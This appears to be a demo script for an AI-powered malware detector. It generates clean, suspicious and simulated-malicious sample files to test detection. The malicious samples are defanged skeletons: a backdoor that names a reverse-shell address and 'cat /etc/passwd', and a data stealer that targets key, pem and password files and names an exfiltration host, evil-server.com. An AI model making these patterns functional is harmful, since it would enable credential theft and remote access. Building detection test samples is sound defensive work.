#!/usr/bin/env python3
"""
AI-Powered Malware Detector Demo Script
=======================================
Demonstrates the complete AI-powered detection system with sample files
Creates test scenarios and shows real-time analysis capabilities
"""

import os
import sys
import time
import shutil
import subprocess
import json
from pathlib import Path
from datetime import datetime

class DetectorDemo:
    """Demonstrates AI-powered malware detection capabilities"""
    
    def __init__(self):
        self.demo_dir = Path("ai_detector_demo")
        self.sample_files = []
        
    def create_demo_environment(self):
        """Create demo environment with test files"""
        print(" CREATING DEMO ENVIRONMENT")
        print("=" * 50)
        
        # Clean up existing demo directory
        if self.demo_dir.exists():
            shutil.rmtree(self.demo_dir)
        
        self.demo_dir.mkdir()
        print(f" Created demo directory: {self.demo_dir}")
        
        # Create subdirectories
        (self.demo_dir / "clean_files").mkdir()
        (self.demo_dir / "suspicious_files").mkdir()
        (self.demo_dir / "malicious_files").mkdir()
        (self.demo_dir / "ai_generated").mkdir()
        
        # Create sample files
        self._create_clean_files()
        self._create_suspicious_files()
        self._create_malicious_files()
        self._create_ai_generated_files()
        
        print(f" Created {len(self.sample_files)} test files")
        return self.demo_dir
    
    def _create_clean_files(self):
        """Create legitimate clean files"""
        
        # Simple utility script
        clean_util = self.demo_dir / "clean_files" / "utility.py"
        clean_util.write_text('''#!/usr/bin/env python3
"""Simple utility script for file operations"""

import os
from pathlib import Path

def list_files(directory):
    """List all files in directory"""
    path = Path(directory)
    return [f.name for f in path.iterdir() if f.is_file()]

def get_file_size(file_path):
    """Get file size in bytes"""
    return os.path.getsize(file_path)

def main():
    current_dir = "."
    files = list_files(current_dir)
    print(f"Found {len(files)} files")
    
    for file in files[:5]:  # Show first 5 files
        size = get_file_size(file)
        print(f"{file}: {size} bytes")

if __name__ == "__main__":
    main()
''')
        
        # Configuration file
        config_file = self.demo_dir / "clean_files" / "config.json"
        config_file.write_text(json.dumps({
            "app_name": "Demo Application",
            "version": "1.0.0",
            "settings": {
                "debug": False,
                "log_level": "INFO"
            }
        }, indent=2))
        
        # Simple web server
        web_server = self.demo_dir / "clean_files" / "simple_server.py"
        web_server.write_text('''#!/usr/bin/env python3
"""Simple HTTP server for development"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket

class CustomHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[{self.date_time_string()}] {format % args}")

def find_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

def main():
    port = find_free_port()
    server = HTTPServer(('localhost', port), CustomHandler)
    print(f"Server running on http://localhost:{port}")
    print("Press Ctrl+C to stop")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\\nServer stopped")

if __name__ == "__main__":
    main()
''')
        
        self.sample_files.extend([clean_util, config_file, web_server])
    
    def _create_suspicious_files(self):
        """Create files with suspicious but not necessarily malicious patterns"""
        
        # Network scanner
        network_tool = self.demo_dir / "suspicious_files" / "network_scanner.py"
        network_tool.write_text('''#!/usr/bin/env python3
"""Network connectivity checker"""

import socket
import subprocess
import sys
import platform

def check_port(host, port, timeout=3):
    """Check if port is open on host"""
    try:
        with socket.create_connection((host, port), timeout):
            return True
    except (OSError, socket.timeout):
        return False

def ping_host(host):
    """Ping a host to check connectivity"""
    try:
        # Use ping command
        if platform.system() == 'Windows':
            result = subprocess.run(['ping', '-n', '1', host], 
                                  capture_output=True, text=True, timeout=5)
        else:
            result = subprocess.run(['ping', '-c', '1', host], 
                                  capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception as e:
        print(f"[ERROR] Ping failed: {e}")
        return False

def scan_common_ports(host):
    """Scan common ports on host"""
    common_ports = [22, 23, 53, 80, 110, 143, 443, 993, 995]
    open_ports = []
    
    print(f"Scanning {host}...")
    for port in common_ports:
        if check_port(host, port):
            open_ports.append(port)
            print(f"Port {port}: OPEN")
    
    return open_ports

def main():
    if len(sys.argv) != 2:
        print("Usage: python network_scanner.py <host>")
        sys.exit(1)
    
    host = sys.argv[1]
    
    # Check basic connectivity
    if ping_host(host):
        print(f"{host} is reachable")
        scan_common_ports(host)
    else:
        print(f"{host} is not reachable")

if __name__ == "__main__":
    main()
''')
        
        # System information gatherer
        sys_info = self.demo_dir / "suspicious_files" / "system_info.py"
        sys_info.write_text('''#!/usr/bin/env python3
"""System information collection tool"""

import os
import platform
import subprocess

def get_system_info():
    """Collect basic system information"""
    if platform.system() == 'Windows':
        current_user = os.environ.get('USERNAME', 'unknown')
        home_directory = os.environ.get('USERPROFILE', 'unknown')
    else:
        current_user = os.environ.get('USER', 'unknown')
        home_directory = os.environ.get('HOME', 'unknown')
    info = {
        'platform': platform.platform(),
        'system': platform.system(),
        'processor': platform.processor(),
        'python_version': platform.python_version(),
        'current_user': current_user,
        'home_directory': home_directory,
        'path': os.environ.get('PATH', '')[:100] + '...'
    }
    return info

def get_running_processes():
    """Get list of running processes (safe implementation)"""
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['tasklist'], capture_output=True, text=True)
        else:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        return result.stdout.split('\n')[:10]  # First 10 lines only
    except Exception as e:
        return [f"Could not retrieve process list: {e}"]

def main():
    print("System Information Report")
    print("=" * 40)
    
    # Basic system info
    sys_info = get_system_info()
    for key, value in sys_info.items():
        print(f"{key}: {value}")
    
    print("\nRunning Processes (sample):")
    processes = get_running_processes()
    for proc in processes[:5]:  # Show only first 5
        print(f"  {proc}")

if __name__ == "__main__":
    main()
''')
        
        self.sample_files.extend([network_tool, sys_info])
    
    def _create_malicious_files(self):
        """Create files with clearly malicious patterns"""
        
        # Reverse shell simulation (harmless)
        reverse_shell = self.demo_dir / "malicious_files" / "backdoor.py"
        reverse_shell.write_text('''#!/usr/bin/env python3
"""
DEMO ONLY - Simulated backdoor (does not actually connect)
This file contains malicious patterns for detection testing
"""

import socket
import subprocess
import base64
import os

# Encoded payload (harmless demo data)
PAYLOAD = "ZWNobyAiSGFybWxlc3MgZGVtbyBwYXlsb2FkIg=="

def establish_connection():
    """Simulate establishing reverse connection"""
    try:
        # This would normally connect to attacker server
        # For demo: just print what would happen
        print("[DEMO] Would connect to: 192.168.1.100:4444")
        print("[DEMO] Connection simulation - no actual network activity")
        return None  # Return None instead of actual socket
    except:
        return None

def execute_commands(connection):
    """Simulate command execution"""
    if connection is None:  # Demo mode
        print("[DEMO] Would execute remote commands")
        return
    
    # Dangerous command execution patterns
    commands = [
        "whoami",
        "pwd", 
        "ls -la",
        "cat /etc/passwd"  # Sensitive file access
    ]
    
    for cmd in commands:
        print(f"[DEMO] Would execute: {cmd}")
        # In real malware: subprocess.run(cmd, shell=True)

def decode_payload():
    """Decode and execute hidden payload"""
    try:
        decoded = base64.b64decode(PAYLOAD)
        print(f"[DEMO] Decoded payload: {decoded.decode()}")
        # In real malware: exec(decoded)
    except:
        pass

def persistence_mechanism():
    """Simulate persistence installation"""
    print("[DEMO] Would install persistence via:")
    print("  - Registry modification (Windows)")
    print("  - Crontab entry (Linux)")
    print("  - Startup folder (Windows)")

def main():
    print("DEMO BACKDOOR - Educational Purpose Only")
    print("This file contains malicious patterns but is harmless")
    
    # Simulate malicious workflow
    connection = establish_connection()
    execute_commands(connection)
    decode_payload()
    persistence_mechanism()
    
    print("[DEMO] Backdoor simulation complete")

if __name__ == "__main__":
    main()
''')
        
        # Data exfiltration script
        exfiltrator = self.demo_dir / "malicious_files" / "data_stealer.py"
        exfiltrator.write_text('''#!/usr/bin/env python3
"""
DEMO ONLY - Simulated data exfiltration (does not steal data)
Contains malicious patterns for educational testing
"""

import os
import glob
import base64
import urllib.request
import json

# Target file patterns (common sensitive files)
TARGET_PATTERNS = [
    "*.txt",
    "*.doc*", 
    "*.pdf",
    "*.xls*",
    "password*",
    "*.key",
    "*.pem"
]

def find_target_files(directory="."):
    """Find files matching sensitive patterns"""
    found_files = []
    
    print(f"[DEMO] Scanning directory: {directory}")
    
    for pattern in TARGET_PATTERNS:
        matches = glob.glob(os.path.join(directory, pattern))
        found_files.extend(matches)
    
    print(f"[DEMO] Found {len(found_files)} potential target files")
    return found_files[:5]  # Limit for demo

def collect_file_data(file_paths):
    """Simulate sensitive data collection"""
    collected_data = []
    
    for file_path in file_paths:
        try:
            # In real malware: would read file contents
            file_info = {
                'path': file_path,
                'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0,
                'demo_note': 'File contents would be read here'
            }
            collected_data.append(file_info)
            print(f"[DEMO] Would collect: {file_path}")
        except:
            continue
    
    return collected_data

def exfiltrate_data(data):
    """Simulate data exfiltration"""
    # Encode data for transmission
    json_data = json.dumps(data)
    encoded_data = base64.b64encode(json_data.encode()).decode()
    
    print("[DEMO] Would exfiltrate data to:")
    print("  URL: http://evil-server.com/collect")
    print(f"  Size: {len(encoded_data)} bytes")
    print("  Method: HTTP POST")
    
    # In real malware: 
    # urllib.request.urlopen(url, data=encoded_data.encode())

def cover_tracks():
    """Simulate evidence removal"""
    print("[DEMO] Would cover tracks by:")
    print("  - Clearing system logs")
    print("  - Removing temporary files") 
    print("  - Modifying timestamps")

def main():
    print("DEMO DATA STEALER - Educational Purpose Only")
    print("Contains exfiltration patterns but is harmless")
    
    # Simulate malicious workflow
    target_files = find_target_files()
    collected_data = collect_file_data(target_files)
    exfiltrate_data(collected_data)
    cover_tracks()
    
    print("[DEMO] Data theft simulation complete")

if __name__ == "__main__":
    main()
''')
        
        self.sample_files.extend([reverse_shell, exfiltrator])
    
    def _create_ai_generated_files(self):
        """Create files that look AI-generated"""
        
        # AI-generated looking script
        ai_script = self.demo_dir / "ai_generated" / "ai_malware_sample.py"
        ai_script.write_text('''#!/usr/bin/env python3
"""
AI-Generated Malware Sample - Educational Demo
This file exhibits typical AI-generated code patterns
"""

# Import necessary libraries for system operations
import os
import sys
import time  
import json
import base64
import hashlib
import subprocess
from datetime import datetime
from pathlib import Path

class SystemInformationCollector:
    """
    This class handles the collection of system information
    for analysis and reporting purposes
    """
    
    def __init__(self):
        # Initialize the system information collector
        self.collected_data = {}
        self.processing_status = "initialized"
        
    def collect_environment_variables(self):
        """
        Function to collect environment variables from the system
        This method gathers important system configuration data
        """
        try:
            # Get environment variables for analysis
            environment_data = {}
            
            # Loop through environment variables
            for key, value in os.environ.items():
                # Check if environment variable is relevant
                if key in ['PATH', 'HOME', 'USER', 'TEMP']:
                    # Store the environment variable
                    environment_data[key] = value
            
            # Update collected data with environment information
            self.collected_data['environment'] = environment_data
            print("[INFO] Environment variable collection completed successfully")
            
        except Exception as error_occurred:
            # Handle any errors during environment collection
            print(f"[ERROR] Failed to collect environment variables: {error_occurred}")
            
    def gather_system_information(self):
        """
        Method to gather comprehensive system information
        This function collects various system details for analysis
        """
        try:
            # Initialize system information dictionary
            system_info = {}
            
            # Get current working directory information
            current_directory = os.getcwd()
            system_info['working_directory'] = current_directory
            
            # Get system platform information
            platform_information = sys.platform
            system_info['platform'] = platform_information
            
            # Get Python version information
            python_version_info = sys.version
            system_info['python_version'] = python_version_info
            
            # Store system information in collected data
            self.collected_data['system_info'] = system_info
            print("[INFO] System information gathering completed successfully")
            
        except Exception as system_error:
            # Handle system information gathering errors
            print(f"[ERROR] System information gathering failed: {system_error}")

class FileOperationsManager:
    """
    This class manages file operations and data storage
    for the malware analysis system
    """
    
    def __init__(self, target_directory):
        # Initialize file operations manager
        self.target_directory = target_directory
        self.created_files = []
        self.operation_log = []
        
    def create_target_directory(self):
        """
        Function to create the target directory for operations
        This method ensures the target directory exists
        """
        try:
            # Check if target directory already exists
            if not os.path.exists(self.target_directory):
                # Create the target directory
                os.makedirs(self.target_directory)
                print(f"[INFO] Target directory created: {self.target_directory}")
            else:
                # Directory already exists
                print(f"[INFO] Target directory already exists: {self.target_directory}")
                
        except Exception as directory_error:
            # Handle directory creation errors
            print(f"[ERROR] Directory creation failed: {directory_error}")
            
    def write_data_to_file(self, filename, data):
        """
        Method to write data to a specified file
        This function handles file writing operations
        """
        try:
            # Generate full file path
            file_path = os.path.join(self.target_directory, filename)
            
            # Write data to file
            with open(file_path, 'w') as output_file:
                # Check if data is dictionary
                if isinstance(data, dict):
                    # Write JSON data
                    json.dump(data, output_file, indent=2)
                else:
                    # Write string data
                    output_file.write(str(data))
            
            # Add to created files list
            self.created_files.append(file_path)
            print(f"[INFO] Data written to file: {file_path}")
            
        except Exception as write_error:
            # Handle file writing errors
            print(f"[ERROR] File writing failed: {write_error}")

def execute_main_operations():
    """
    Main function to execute the primary operations
    This function orchestrates the entire process
    """
    print("[STAGE 1] Initializing system analysis...")
    
    # Initialize system information collector
    info_collector = SystemInformationCollector()
    
    print("[STAGE 2] Collecting environment data...")
    # Collect environment variables
    info_collector.collect_environment_variables()
    
    print("[STAGE 3] Gathering system information...")
    # Gather system information
    info_collector.gather_system_information()
    
    print("[STAGE 4] Initializing file operations...")
    # Initialize file operations manager
    file_manager = FileOperationsManager("./analysis_output")
    
    print("[STAGE 5] Creating output directory...")
    # Create target directory
    file_manager.create_target_directory()
    
    print("[STAGE 6] Writing collected data...")
    # Write collected data to file
    file_manager.write_data_to_file("analysis_results.json", info_collector.collected_data)
    
    print("[STAGE 7] Operations completed successfully")

# Main execution block
if __name__ == "__main__":
    # Execute main operations
    execute_main_operations()
''')
        
        self.sample_files.append(ai_script)
    
    def run_detector_demo(self):
        """Run the AI-powered detector on demo files"""
        print("\n RUNNING AI POWERED MALWARE DETECTOR")
        print("=" * 60)
        
        # Check if detector script exists
        detector_script = Path("ai_powered_detector.py")
        if not detector_script.exists():
            print(" ai_powered_detector.py not found")
            print("Please ensure the detector script is in the current directory")
            return False
        
        # Test each category
        categories = [
            ("Clean Files", self.demo_dir / "clean_files"),
            ("Suspicious Files", self.demo_dir / "suspicious_files"), 
            ("Malicious Files", self.demo_dir / "malicious_files"),
            ("AI-Generated Files", self.demo_dir / "ai_generated")
        ]
        
        for category_name, category_path in categories:
            print(f"\n TESTING: {category_name}")
            print("-" * 40)
            
            # Get first file in category
            files = list(category_path.glob("*.py"))
            if files:
                test_file = files[0]
                print(f"Analyzing: {test_file.name}")
                
                try:
                    # Run detector on file
                    result = subprocess.run([
                        sys.executable, str(detector_script), str(test_file)
                    ], capture_output=True, text=True, timeout=120)
                    
                    if result.returncode == 0:
                        # Show key parts of output
                        output_lines = result.stdout.split('\n')
                        for line in output_lines:
                            if any(keyword in line for keyword in 
                                  ['ANALYZING:', 'YARA MATCHES', 'AI ANALYSIS:', 'FINAL ASSESSMENT', 'VERDICT:']):
                                print(f"  {line}")
                    else:
                        print(f"   Analysis failed.\n  STDOUT: {result.stdout}\n  STDERR: {result.stderr}")
                        
                except subprocess.TimeoutExpired:
                    print("  ⏰ Analysis timed out (normal for first AI model load)")
                except Exception as e:
                    print(f"   Error: {e}")
            else:
                print("  No Python files found in category")
    
    def run_real_time_demo(self):
        """Demonstrate real-time monitoring"""
        print("\n REAL-TIME MONITORING DEMO")
        print("=" * 50)
        
        detector_script = Path("ai_powered_detector.py")
        if not detector_script.exists():
            print(" ai_powered_detector.py not found")
            return False
        
        print("Starting real-time monitoring (will run for 30 seconds)...")
        print("Creating new files to trigger detection...")
        
        # Start real-time monitoring in background
        monitor_process = subprocess.Popen([
            sys.executable, str(detector_script), str(self.demo_dir), "--watch"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        try:
            # Create new files to trigger detection
            time.sleep(2)
            
            # Create a suspicious file
            suspicious_file = self.demo_dir / "new_suspicious.py"
            suspicious_file.write_text('''
import subprocess
import base64

# Encoded command
cmd = base64.b64decode("ZWNobyBoZWxsbw==")
subprocess.run(cmd, shell=True)
''')
            print(f" Created: {suspicious_file.name}")
            
            time.sleep(3)
            
            # Create an AI-generated looking file
            ai_file = self.demo_dir / "new_ai_generated.py"
            ai_file.write_text('''
# Import necessary libraries
import os
import sys

# Function to process data
def process_data_information():
    """
    This function processes data information
    for analysis and reporting purposes
    """
    # Initialize data processing
    print("[INFO] Processing data...")
    
# Main execution function
def main():
    # Execute data processing
    process_data_information()

if __name__ == "__main__":
    main()
''')
            print(f" Created: {ai_file.name}")
            
            # Wait and then terminate monitoring
            time.sleep(10)
            
        finally:
            print("\n Stopping real-time monitoring...")
            monitor_process.terminate()
            try:
                monitor_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                monitor_process.kill()
        
        return True
    
    def cleanup_demo(self):
        """Clean up demo files"""
        print(f"\n CLEANING UP DEMO FILES")
        print("-" * 30)
        
        if self.demo_dir.exists():
            shutil.rmtree(self.demo_dir)
            print(f" Removed: {self.demo_dir}")
        
        # Remove any additional test files
        cleanup_files = ["new_suspicious.py", "new_ai_generated.py"]
        for filename in cleanup_files:
            if Path(filename).exists():
                Path(filename).unlink()
                print(f" Removed: {filename}")
    
    def print_demo_summary(self):
        """Print demo summary and next steps"""
        print("\n" + "=" * 60)
        print(" AI POWERED MALWARE DETECTOR DEMO COMPLETE")
        print("=" * 60)
        
        print(" DEMO RESULTS SUMMARY:")
        print("• Clean files should show:  CLEAN")
        print("• Suspicious files should show:  SUSPICIOUS") 
        print("• Malicious files should show:  MALICIOUS")
        print("• AI-generated files should show:  SUSPICIOUS (AI patterns)")
        
        print("\n NEXT STEPS:")
        print("1. Install Ollama: https://ollama.ai/download")
        print("2. Run setup: python setup_detector.py")
        print("3. Start monitoring: python ai_powered_detector.py /path --watch")
        
        print("\n TIPS:")
        print("• First AI analysis may be slow (model loading)")
        print("• Use smaller models (llama3.2:1b) for faster testing")
        print("• Review all detections manually before taking action")
        print("• Monitor system resources during intensive scanning")
        
        print("\n TROUBLESHOOTING:")
        print("• If Ollama errors: Check 'ollama serve' is running")
        print("• If YARA errors: Run 'pip install --upgrade yara-python'")
        print("• For slow performance: Use lightweight AI models")
        
        print("\n" + "=" * 60)
        print("\nTo clean up later:")
        if os.name == 'nt':
            print("  rmdir /s /q ai_detector_demo")
        else:
            print("  rm -rf ai_detector_demo")

def main():
    """Main demo function"""
    print("AI-POWERED MALWARE DETECTOR")
    print("=" * 50)
    
    demo = DetectorDemo()
    
    try:
        # Create demo environment
        demo.create_demo_environment()
        
        # Run detection tests
        demo.run_detector_demo()
        
        # Demonstrate real-time monitoring
        # demo.run_real_time_demo()  # Commented out by default
        
        # Show summary
        demo.print_demo_summary()
        
        # Ask about cleanup
        print("\n" + "=" * 50)
        if sys.stdin.isatty():
            response = input("Clean up demo files? [y/N]: ").strip().lower()
            if response in ['y', 'yes']:
                demo.cleanup_demo()
            else:
                print(f"Demo files preserved in: {demo.demo_dir}")
        else:
            print("Non-interactive mode: Skipping cleanup prompt.")
    
    except KeyboardInterrupt:
        print("\n\n Demo interrupted by user")
        demo.cleanup_demo()
    except Exception as e:
        print(f"\n Demo error: {e}")
        print("Cleaning up...")
        demo.cleanup_demo()

if __name__ == "__main__":
    main()
